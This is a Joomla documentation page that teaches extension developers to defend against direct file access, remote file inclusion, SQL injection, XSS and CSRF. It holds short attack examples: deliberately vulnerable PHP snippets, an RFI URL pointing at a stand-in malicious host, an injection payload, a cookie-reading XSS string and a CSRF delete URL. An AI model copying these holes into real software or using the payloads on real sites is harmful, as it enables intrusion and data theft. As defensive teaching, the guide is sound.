<!-- Filename: Securing_Joomla_extensions / Display title: Securing Joomla extensions -->

By default, Joomla! is very secure. While most core components are safe
and secure, often hackers get into the system by using third party
extensions. This article is targeted at giving you an easy guide for
making your extension as safe as possible.

*We strongly recommend using these functions to ensure maximum
security.*

## Intro: Guide to more secure Components/Modules/Plugins...

Are you a third party developer for Joomla! addons? Do you publish your
programs on the Joomla! forge or on your website? Well, thank you for
doing that, the community probably loves you for sharing your work!

However, there are a few things in terms of security that you should be
aware of. Just having a component that runs fine on your computer is
usually not enough! You need to take care of security, because otherwise
your programm could easily ruin the websites of your customers.

So, lets just jump right into it. These are the topics I will deal with
in this guide:

- Secure your software against direct access
- Secure your software against remote file inclusion
- Secure your software against SQL injections
- Secure your software against XSS scripting
- Secure your software against cross-site request forgery
- Avoid open (0777) file and folder permissions
- Check access privileges of users
- How to achieve raw component output (for pictures, RSS-feeds etc.)
- Various things to be aware of
- What to do if you discover a security issue in your software

Please note that when I refer to components, I also mean modules,
plugins and templates as well. All code examples in this guide are
written for Joomla! 3.x. although the same examples will usually apply
to 2.5.x as well.

## Secure your software against direct access

The files of your component will usually be called by Joomla!. Joomla!
is a wrapper around your software, it provides many useful features like
user authentication and so on. Since developers usually test their
components only through Joomla!, they tend to forget about the
possibility of calling files directly. Instead of calling your component
by

    http:/ /www.example.com/index.php?option=com_yourcomponent

attackers also might try to use

    http:/ /www.example.com/components/com_yourcomponent/yourcomponent.php

As you can see, the PHP file will be executed directly, without Joomla!
as a wrapper around it. Now, if your file only contains some classes or
functions, but does not execute any code, there is nothing wrong about
that:

The cracker would just see an empty page when accessing your file
directly. But if that PHP file actually executes anything, he would
probably see a bunch of error messages, revealing important details of
your system. Under some circumstances, he might also be able to execute
any code he wants to, on your system!

**Conclusion:**

To make your component secure against direct access, insert this code
line into the beginning of every PHP file that executes code:

    // no direct access
    defined('_JEXEC') or die('Restricted access');

This is a MUST for every file that executes PHP code. If you are in
doubt whether your file executes code, do use this line!

## Secure your software against remote file inclusion

Recent advances in PHP and Joomla security have made this exploit more
difficult, but it is still important to be aware of it and guard against
it, particularly if you allow user input to define a file path For
example suppose in a template you use code such as the following:-

    $layout = $_GET['layout'];
    include($layout);

An attacker could craft the url to inject a remote file name into the
layout parameter, for example they may try to access your component as:-

    http://www.example.com/com_yourcomponent/views/yourcomponent?layout=http://www.bad.site/bad.gif

which actually sends back executable PHP code under the filename of that
image. The attacker can do anything he wants to do on your webserver!
This is called remote file inclusion. Unfortunately, this is something
even script kiddies could do easily. How to secure against this? Firstly
this kind of attack is made much more difficult by using the absolute
path when including a file, it removes any ambiguity about where PHP
should find the file, for example

    $layout = $_GET['layout'];
    include(JPATH_SITE. '/components/com_yourcomponent/views/tmpl/'.$layout );

or

    include(JPATH_ADMINISTRATOR. '/components/com_yourcomponent/views/tmpl/'.$layout );

As constants JPATH_SITE and JPATH_ADMINISTRATOR are not vulnerable to
manipulation by an attacker. They are defined by Joomla and are
available to use anywhere in your code where you require the path to the
site. However we can do considerably better than this by also properly
sanitizing the user input, using the Joomla JInput class rather than the
raw \$\_GET array.

    $jinput = JFactory::getApplication()->input;
    $layout = $jinput->get('layout','default');
    include(JPATH_SITE. '/components/com_yourcomponent/views/tmpl/'.$layout );

By default JInput applies the CMD filter to user input, which only
allows the following characters: a-z, 0-9, underscore, dot, dash. If you
want to use other filters you can find out more about JInput at
[Retrieving_request_data_using_JInput](https://docs.joomla.org/Retrieving_request_data_using_JInput "Retrieving request data using JInput").
Note that using the CMD filter will prevent the inclusion of remote
files by excluding the necessary charactes :/, also the exclusion of
directory separators in the file name will prevent directory traversal,
where an attacker attempts to manipulate the path to include a file on
the same server that they should not have access to. Remote file
inclusion only works on systems that have the PHP setting
allow_url_fopen switched to on. But as this option is needed by many
"good" programs as well, switching it off is not always a good idea. You
should not rely on allow_url_fopen being turned off, but instead write
secure code that cannot be exploited when it is turned on.

**Conclusion:** To secure your code against remote file inclusion, you
need to make sure no unvalidated input is used when including files. You
should never use the raw \$\_GET and \$\_POST arrays, instead use the
Joomla JInput class, which includes sanitization of use input. Secondly,
be very careful with all calls to functions dealing with the file
system, especially e.g. include, require, include_once, require_once,
fopen. If you really need to include files with variable names, make
sure to validate all these variables, try to lock down as far as
possible the range of allowed values.

## Secure your software against SQL injections

SQL injections make it possible for attackers to modify certain unsafe
SQL queries, your script executes, in such a way that it could alter
data in your database or give out sensible data to the attacker. That is
because of unvalidated user input.

Take a look at this code:

    $value = $_GET['value'];
     $database->setQuery( "SELECT * FROM #__mytable WHERE id = $value" );

An attacker could hand over a string like '1 OR 1', the query results in

    "SELECT * FROM #__mytable WHERE id = 1 OR 1"

, thus returning all rows from jos_mytable. This is a particularly
simple example of a possible exploit, there are many others. One common
misconception among developers is that SQL injection can only be used to
manipulate results from the table in the original SQL statement, so
therefore may not be much of a security risk if the table is
unimportant. This is wrong: by including a UNION SELECT command in the
injected SQL an attacker may be able to access any table in the Joomla
database, it is a very big security risk.

I'm not going more into detail here, as SQL injections are covered quite
well on the web. Please take a look at the resources listed at the
bottom of this post.

**Conclusion:** Validate all user input before you use it in a SQL
query. Apply

    $db = JFactory::getDBO();
    $string = $db->escape( $string );

to all strings that will be used in SQL queries, and apply

    $value = intval( $value );

  
to all integer numbers you use in SQL queries. It is a good idea to do
this even if you think that the values will never be obtained from user
input. You don't know how your code may be used in future. Again, for
more information on SQL injections, please take a look at the listed
resources, especially \[3.2\].

As a rule you should always obtain any user input using the Joomla
JInput Class rather than the raw \$\_GET and \$\_POST arrays, however
note that you cannot necessarily rely on this alone to prevent SQL
injection. Injection attacks can be accomplished using characters that
in other circumstances are perfectly acceptable, so the filters you use
may not be enough to prevent them. The only reliable way to prevent
injection attacks is to escape all string values using \$db-\>escape(),
and use type casting for numeric values as in the examples above.

## Secure your software against XSS

Cross Site Scripting (XSS) means executing script code (e.g. JavaScript)
in a visitors browser. These attacks can be used to steal a user's
session cookie and hence allow an attacker to impersonate a logged in
user, so can be very dangerous. Be careful not to echo out any
unvalidated input to a user. Code like this is dangerous for your
visitors:

    echo $_REQUEST['value'];

**Conclusion:** Use JInput to obtain any user input, for example

    $jinput = JFactory::getApplication()->input;
    $value = $Jinput->get('value','','html');
    echo $value;

This will strip out all html tags and attributes. However you should
also use your judgement about what are acceptable values. If you think
that there is any chance that some html code could have slipped through
you can use in addition the PHP htmlspecialchars() function

    $value = htmlspecialchars( $value );
    echo $value;

Moreover, if you are using user input to obtain a javascript value you
need to be even more careful, just stripping out html will not be
enough, for example consider this which might be included in an html
template:

      var colour = <?php echo $jinput->get('colour','blue','alnum'); ?>;

In this case we have used the 'alnum' filter, which removes all except
characters a to z and 0 to 9. You need a very restrictive filter such as
this to be safe, because otherwise it may be possible to add additional
javascript statements using only simply punctuation, including
characters such as '();. For example, consider what would happen if an
attacker inlcudes in the query string:

    colour=blue%3B%20window.alert(document.cookie)%3B

If you use a filter that removes only html tags, this results in the
javascript statements:

      var colour = blue;
      window.alert(document.cookie);

## Secure your extension against cross-site request forgery

Suppose a site superuser is logged into their site, and visits a hacked
web page on another site, which includes a bogus image with the source
of

    http://example.com/administrator/index.php?option=com_yourcomponent&task=deleteall

Their browser will attempt to load the bogus image, and in doing so
delete everything in the component database. Joomla includes in-built
protection against this sort of thing, in the form of the session token.
You will probably have encountered this yourself if you try to log into
a Joomla site on a page that has stood idle for some time: it will fail
with an 'invalid token' message. This is an essential security feature.
To use this feature in your extension (which you should always do), you
need to include the token in any form that your extension uses.

Then before your extension does anything dangerous such as deleting, you
check for a valid token:

           JSession::checkToken() or jexit( 'Invalid Token' );

## Avoid open (0777) file and folder permissions

It has become something of a habit among PHP developers of software that
uses file manipulation to use files and folders with the Linux
permissions of 0777. This makes them writable by anyone with an account
on the same server. This is a security risk for sites hosted on a shared
server (which includes many sites). If you search for this topic on the
web you will find some who disagree with this, because PHP scripts will
not normally be executed with file permissions above 0644 and folder
permissions above 0755. This argument completely ignores the danger from
non-PHP files. Cross site scripting attacks (discussed above) are
normally accomplished through malicious html and javascript, also
sometimes vulnerable Flash movies or Java applets. Open folder and file
permissions make a site vulnerable to such attacks. You should never
create open folders and files with your software, by default and without
the customer's knowledge and permission. If they understand the risks
and are prepared to use open folders on their site that is fine, it is
their site. Unfortunately too many developers do not bother to ask and
allow their software to create open folders upon installation without
the customer's knowledge. Really there is no good reason for ever using
open folders in your software. If you need to avoid difficulties with
folder ownership, use chmod to temporarily open them - then shut them
afterwards.

## Check access privileges of users

When allowing a site user to undertake certain actions, such as
creating, editing and deleting items you should make sure that only
users who have the correct permissions can do so. This is particularly
important if your extension is a component that allows front-end
editing, because otherwise any site user will normally be able to access
these actions. It is also important to include some basic permission
checks in the administrator section of your component to check if the
user is authorized to manage the component.

The Joomla ACL (access control list) system is a big topic, and there is
not room to do more than point you in the right direction. There is a
good tutorial on incorporating ACL into your extension here: <a
href="https://docs.joomla.org/J2.5:Developing_a_MVC_Component/Adding_ACL"
class="mw-redirect"
title="J2.5:Developing a MVC Component/Adding ACL">Developing a MVC
Component / Adding ACL</a>

The basics of incorporating ACL are actually quite simple, there are
three stages:

1.  Include a file access.xml in the administrator folder of your
    component, this file will describe the actions that you want to
    control access to, for example

<!-- -->


        
            
            
            

1.  1.  Include a permissions fieldset in your component's config.xml
        file, this will allow the site's administrator to set the
        permissions for these actions

<!-- -->

       

            
        

1.  1.  1.  Use the JUser \$user-\>authorise method in your component's
            controller to check if the user is has the correct
            permissions for the action, for example:

<!-- -->

    if (!JFactory::getUser()->authorise('core.manage', 'com_example')) {
            return JError::raiseWarning(404, JText::_('JERROR_ALERTNOAUTHOR'));
    }

  
**Conclusion:** You can check these values to block access to certain
parts of your component.

Also, make sure not to present any information to a user he does not
have access to. You can use the JUser \$user-\>getAuthorisedViewLevels
method to obtain the view levels that the user has access to:

    $user = JFactory::getUser();
    $groups = implode(',', $user->getAuthorisedViewLevels());

A simple SQL query that takes into account the permissions of the
category for a certain databse entry (assuming your data is sorted into
categories) might look like this:

    SELECT * FROM #__contact_details AS c
     LEFT JOIN #__categories AS cat ON cat.id = c.catid
     WHERE ( c.name LIKE '%$text%' )
     AND c.published = 1
     AND cat.published = 1
     AND c.access IN ($groups)
     AND cat.access IN ($groups)

Note that both the contact details and the category are checked for
being published and for being within the users access level. Remember
also that \$text must be escaped if the value is obtain from user input.

## How to achieve raw component output (for pictures, RSS-feeds etc.)

In some cases, users need to send out raw data (no Joomla! template
around it) to the browser, for example binary pictures or XML data for
RSS feeds. Developers tend to write their own entry point PHP files, but
this should only be a last resort. It is much more secure to let Joomla!
handle things, then Joomla's security features will be used.

**Conclusion:** To just obtain the component output is very easy, just
add tmpl=component to the URL for example

    index.php?option=com_content&view=category&id=14&tmpl=component

To send a non-html response, such as an xml feed or an image is almost
as simple:

    http:/ /www.example.com/index.php?option=com_yourcomponent&format=xml

Then in the views folder of your component include a file called
view.xml.php. In this file it is helpful to tell Joomla what type of
output to produce, so that it knows it is not html:

    $document =& JFactory::getDocument();
    $document->setType('xml');

However if your xml output is a standard RSS feed you can use
format=feed instead, and use a view file called view.feed.php, Joomla
will automatically understand the correct document type. To output an
image is quite a similar process, use an URL such as

    http:/ /www.example.com/index.php?option=com_yourcomponent&format=img

Then in your component views folder include a file called view.img.php.
You will need to set the mime encoding of the output, for example to
output a PNG image use:

       $document =& JFactory::getDocument();
        $document->setMimeEncoding('image/png');

## Various things to be aware of

There are some more things you should not do, and also some functions
you should not use at all.

- Don't use eval(). eval() is evil! Tongue
- Don't use the backtick operator \[8.2\], exec, shell_exec, system,
  popen and such functions
- Don't automatically send out an email to you whenever your component
  becomes installed somewhere. This will give you a bad reputation!
- We should never ever see the use of @\$\_GET or @\$\_POST, etc, in the
  code
- Don't include any admin 'back doors' in your code, most especially not
  ones with hard-coded passwords. You may laugh, but this has happened
- Don't obfuscate your code, for example by using base 64 encoding, it
  worries users when they find it, makes the code difficult to debug,
  and violates the GPL license under which Joomla extensions are
  required to be licensed
- Beware of including external libraries in your extension, check what
  they actually contain. A lot of Flash and javascript libraries will
  include demo application code, sometimes these include things like
  file uploaders. You should always strip these out, otherwise users of
  your extension may be unwittingly installing a back door on their
  site.

Generally, code defensively. Don't assume that your data comes from a
trusted source, or has been sanitized elsewhere. Even if it happens to
be true at the moment, your code may be re-used in future in other
contexts where that cannot be guaranteed. The danger points include
saving data to a database, outputting to a browser, and performing admin
tasks. Always perform the appropriate checks before doing these.

## What to do if you discover a security issue in your software

Occasionally you may discover a security issue in your code, or have it
reported to you by someone else, or it may become public knowledge by
being reported to the Joomla vulnerable extensions list (VEL) or other
security-related websites. If this happens there are some things, as a
responsible developer, that you should do.

- Firstly, fix your code
- Notify your users that they need to update, this should include a
  security release announcement on your website, you may want to contact
  your users by email too.
- Notify the Joomla vulnerable extensions list at
  <a href="https://vel.joomla.org" class="external text" target="_blank"
  rel="noreferrer noopener">Joomla! Vulnerable Extensions List</a>

It is up to you how much information you wish to disclose publicly about
the vulnerability. Some developers like to go into detail about how it
might be exploited, others take the view that this just makes life
easier for attackers and prefer to keep it confidential. That is your
choice. The important thing is that your users should be made aware that
they need to update. Some developers don't like to admit it when there
is a problem, in case it damages their reputation. It should not: fixing
your code and informing your users shows that you are a responsible
developer who cares about your users. Issuing security patches is a
normal part of software development, just look at the number of patches
that Microsoft still issue for Windows, and they have been doing it for
years.

## Resources

### Secure your software against direct access

- No resources so far.

### Secure your software against remote file inclusion

- <a
  href="http://www.owasp.org/index.php/PHP_Top_5#P1:_Remote_Code_Execution"
  class="external free" target="_blank"
  rel="nofollow noreferrer noopener">http://www.owasp.org/index.php/PHP_Top_5#P1:_Remote_Code_Execution</a>

### Secure your software against SQL injections

- <a href="http://en.wikipedia.org/wiki/Sql_injection"
  class="external free" target="_blank"
  rel="nofollow noreferrer noopener">http://en.wikipedia.org/wiki/Sql_injection</a>
- <a href="http://php.net/manual/en/security.database.sql-injection.php"
  class="external free" target="_blank"
  rel="nofollow noreferrer noopener">http://php.net/manual/en/security.database.sql-injection.php</a>
- <a href="http://www.owasp.org/index.php/PHP_Top_5#P3:_SQL_Injection"
  class="external free" target="_blank"
  rel="nofollow noreferrer noopener">http://www.owasp.org/index.php/PHP_Top_5#P3:_SQL_Injection</a>

### Secure your software against XSS scripting

- <a href="http://en.wikipedia.org/wiki/Cross-site_scripting"
  class="external free" target="_blank"
  rel="nofollow noreferrer noopener">http://en.wikipedia.org/wiki/Cross-site_scripting</a>
- <a href="http://www.owasp.org/index.php/Cross_Site_Scripting"
  class="external free" target="_blank"
  rel="nofollow noreferrer noopener">http://www.owasp.org/index.php/Cross_Site_Scripting</a>
- <a
  href="http://www.owasp.org/index.php/PHP_Top_5#P2:_Cross-site_scripting"
  class="external free" target="_blank"
  rel="nofollow noreferrer noopener">http://www.owasp.org/index.php/PHP_Top_5#P2:_Cross-site_scripting</a>
- <a href="http://php.net/manual/en/function.htmlspecialchars.php"
  class="external free" target="_blank"
  rel="nofollow noreferrer noopener">http://php.net/manual/en/function.htmlspecialchars.php</a>

### Secure your extension against cross-site request forgery

- [How to add CSRF anti-spoofing to
  forms](https://docs.joomla.org/How_to_add_CSRF_anti-spoofing_to_forms "Special:MyLanguage/How to add CSRF anti-spoofing to forms")

### Check access privileges of users

- No resources so far.

### How to achieve raw component output (for pictures, RSS-feeds etc.)

- No resources so far.

### Various things to be aware of

- <a
  href="http://www.owasp.org/index.php/PHP_Top_5#How_to_Determine_if_you_are_Vulnerable"
  class="external free" target="_blank"
  rel="nofollow noreferrer noopener">http://www.owasp.org/index.php/PHP_Top_5#How_to_Determine_if_you_are_Vulnerable</a>
- <a href="http://php.net/manual/en/language.operators.execution.php"
  class="external free" target="_blank"
  rel="nofollow noreferrer noopener">http://php.net/manual/en/language.operators.execution.php</a>

### What to do if you discover a security issue in your software

- <a href="http://vel.joomla.org" class="external free" target="_blank"
  rel="noreferrer noopener">http://vel.joomla.org</a>
